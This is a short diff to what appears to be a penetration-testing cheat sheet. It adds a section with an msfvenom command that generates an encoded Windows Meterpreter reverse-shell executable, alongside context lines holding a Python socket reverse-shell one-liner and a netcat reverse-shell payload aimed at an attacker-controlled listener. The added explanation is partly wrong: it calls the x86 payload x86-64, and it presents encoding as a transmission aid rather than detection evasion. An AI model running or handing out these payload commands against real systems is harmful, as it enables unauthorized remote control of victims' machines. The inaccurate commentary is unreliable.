@@ -117,6 +117,16 @@ python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STRE
 
 Payload Generator
 
+### Windows Meterpreter Reverse shell
+
+```console
+$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
+
+This payload generates an encoded x86-64 reverse tcp meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly.
+```
+
+### Reverse nc
+
 ```console
 $ msfvenom -p cmd/unix/reverse_netcat lhost=VPN-IP lport=1337 R
 ```
